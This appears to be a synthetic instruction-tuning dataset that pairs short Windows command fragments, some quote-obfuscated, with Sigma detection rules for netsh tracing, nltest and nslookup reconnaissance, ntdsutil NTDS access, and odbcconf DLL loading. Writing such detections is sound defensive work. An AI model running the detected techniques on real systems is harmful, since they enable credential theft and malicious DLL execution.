{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh netsh trace start", "output": "title: New Network Trace Capture Started Via Netsh.EXE\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: test\ndescription: Detects the execution of netsh with the \"trace\" flag in order to start a network capture\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\n    - https://klausjochem.me/2016/02/03/netsh-the-cyber-attackers-tool-of-choice/\nauthor: Kutepov Anton, oscd.community\ndate: 2019-10-24\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'trace'\n            - 'start'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\netsh.exe start trace netsh.exe", "output": "title: New Network Trace Capture Started Via Netsh.EXE\nid: d3c3861d-c504-4c77-ba55-224ba82d0118\nstatus: test\ndescription: Detects the execution of netsh with the \"trace\" flag in order to start a network capture\nreferences:\n    - https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/\n    - https://klausjochem.me/2016/02/03/netsh-the-cyber-attackers-tool-of-choice/\nauthor: Kutepov Anton, oscd.community\ndate: 2019-10-24\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'trace'\n            - 'start'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nltest.exe nltestrk.exe", "output": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nltest.exe \\\"nltest\\\"rk.exe", "output": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nltest nltestrk", "output": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\nltest.exe nltestrk.exe", "output": "title: Nltest.EXE Execution\nid: 903076ff-f442-475a-b667-4f246bcc203b\nrelated:\n    - id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n      type: similar\n    - id: eeb66bbb-3dde-4582-815a-584aee9fe6d1\n      type: obsolete\nstatus: test\ndescription: Detects nltest commands that can be used for information discovery\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm\nauthor: Arun Chauhan\ndate: 2023-02-03\ntags:\n    - attack.discovery\n    - attack.t1016\n    - attack.t1018\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\nltest.exe'\n        - OriginalFileName: 'nltestrk.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\notepad.exe", "output": "title: Notepad Password Files Discovery\nid: 3b4e950b-a3ea-44d3-877e-432071990709\nstatus: experimental\ndescription: Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.\nreferences:\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\n    - https://intel.thedfirreport.com/eventReports/view/57  # Private Report\nauthor: 'The DFIR Report'\ntags:\n    - attack.discovery\n    - attack.t1083\ndate: 2025-02-21\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith: '\\notepad.exe'\n        CommandLine|endswith:\n        # Note: Commandline to contain a file with the string password and a specific extension\n            - 'password*.txt'\n            - 'password*.csv'\n            - 'password*.doc'\n            - 'password*.xls'\n    condition: selection\nfalsepositives:\n    - Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\\"\\notepad.exe\\\"", "output": "title: Notepad Password Files Discovery\nid: 3b4e950b-a3ea-44d3-877e-432071990709\nstatus: experimental\ndescription: Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.\nreferences:\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\n    - https://intel.thedfirreport.com/eventReports/view/57  # Private Report\nauthor: 'The DFIR Report'\ntags:\n    - attack.discovery\n    - attack.t1083\ndate: 2025-02-21\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith: '\\notepad.exe'\n        CommandLine|endswith:\n        # Note: Commandline to contain a file with the string password and a specific extension\n            - 'password*.txt'\n            - 'password*.csv'\n            - 'password*.doc'\n            - 'password*.xls'\n    condition: selection\nfalsepositives:\n    - Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer \\notepad", "output": "title: Notepad Password Files Discovery\nid: 3b4e950b-a3ea-44d3-877e-432071990709\nstatus: experimental\ndescription: Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.\nreferences:\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\n    - https://intel.thedfirreport.com/eventReports/view/57  # Private Report\nauthor: 'The DFIR Report'\ntags:\n    - attack.discovery\n    - attack.t1083\ndate: 2025-02-21\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith: '\\notepad.exe'\n        CommandLine|endswith:\n        # Note: Commandline to contain a file with the string password and a specific extension\n            - 'password*.txt'\n            - 'password*.csv'\n            - 'password*.doc'\n            - 'password*.xls'\n    condition: selection\nfalsepositives:\n    - Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\explorer.exe \\notepad.exe", "output": "title: Notepad Password Files Discovery\nid: 3b4e950b-a3ea-44d3-877e-432071990709\nstatus: experimental\ndescription: Detects the execution of Notepad to open a file that has the string \"password\" which may indicate unauthorized access to credentials or suspicious activity.\nreferences:\n    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/\n    - https://intel.thedfirreport.com/eventReports/view/57  # Private Report\nauthor: 'The DFIR Report'\ntags:\n    - attack.discovery\n    - attack.t1083\ndate: 2025-02-21\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith: '\\explorer.exe'\n        Image|endswith: '\\notepad.exe'\n        CommandLine|endswith:\n        # Note: Commandline to contain a file with the string password and a specific extension\n            - 'password*.txt'\n            - 'password*.csv'\n            - 'password*.doc'\n            - 'password*.xls'\n    condition: selection\nfalsepositives:\n    - Legitimate use of opening files from remote hosts by administrators or users. However, storing passwords in text readable format could potentially be a violation of the organization's policy. Any match should be investigated further.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "nslookup _ldap._tcp.dc._msdcs.", "output": "title: Network Reconnaissance Activity\nid: e6313acd-208c-44fc-a0ff-db85d572e90e\nstatus: test\ndescription: Detects a set of suspicious network related commands often used in recon stages\nreferences:\n    - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-07\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1082\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'nslookup'\n            - '_ldap._tcp.dc._msdcs.'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "nslookup _ldap._tcp\\\".dc._msdcs.\\\"", "output": "title: Network Reconnaissance Activity\nid: e6313acd-208c-44fc-a0ff-db85d572e90e\nstatus: test\ndescription: Detects a set of suspicious network related commands often used in recon stages\nreferences:\n    - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-07\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1082\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'nslookup'\n            - '_ldap._tcp.dc._msdcs.'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "nslookup _ldap._tcp.dc._msdcs.", "output": "title: Network Reconnaissance Activity\nid: e6313acd-208c-44fc-a0ff-db85d572e90e\nstatus: test\ndescription: Detects a set of suspicious network related commands often used in recon stages\nreferences:\n    - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-07\ntags:\n    - attack.discovery\n    - attack.t1087\n    - attack.t1082\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'nslookup'\n            - '_ldap._tcp.dc._msdcs.'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntdsutil.exe", "output": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\nstatus: test\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ndate: 2019-01-16\nmodified: 2022-03-11\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\ntdsutil.exe\"", "output": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\nstatus: test\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ndate: 2019-01-16\nmodified: 2022-03-11\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntdsutil", "output": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\nstatus: test\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ndate: 2019-01-16\nmodified: 2022-03-11\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ntdsutil.exe", "output": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\nstatus: test\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ndate: 2019-01-16\nmodified: 2022-03-11\ntags:\n    - attack.credential-access\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ntdsutil.exe'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe INSTALLDRIVER .dll", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe INSTALLDRIVER \".dll\"", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf odbcconf INSTALLDRIVER .dll", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe .dll INSTALLDRIVER odbcconf.exe", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe INSTALLDRIVER .dll", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe \\\"INSTALLDRIVER\\\" .dll", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf odbcconf INSTALLDRIVER .dll", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe .dll INSTALLDRIVER odbcconf.exe", "output": "title: Driver/DLL Installation Via Odbcconf.EXE\nid: 3f5491e2-8db8-496b-9e95-1029fce852d4\nrelated:\n    - id: cb0fe7c5-f3a3-484d-aa25-d350a7912729\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'INSTALLDRIVER '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate driver DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its contents to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe odbcconf.exe REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\odbcconf.exe \\\"odbcco\\\"nf.exe REGSVR .dll", "output": "title: New DLL Registered Via Odbcconf.EXE\nid: 9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70\nrelated:\n    - id: ba4cfc11-d0fa-4d94-bf20-7c332c412e76\n      type: similar\nstatus: test\ndescription: Detects execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.\nreferences:\n    - https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16\n    - https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n    - https://redcanary.com/blog/raspberry-robin/\n    - https://web.archive.org/web/20191023232753/https://twitter.com/Hexacorn/status/1187143326673330176\n    - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n    - https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-22\ntags:\n    - attack.defense-evasion\n    - attack.t1218.008\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_cli:\n        # Note: The \"/A\" flag is not required to call a specific action\n        CommandLine|contains|all:\n            - 'REGSVR '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate DLLs being registered via \"odbcconf\" will generate false positives. Investigate the path of the DLL and its content to determine if the action is authorized.\nlevel: medium"}
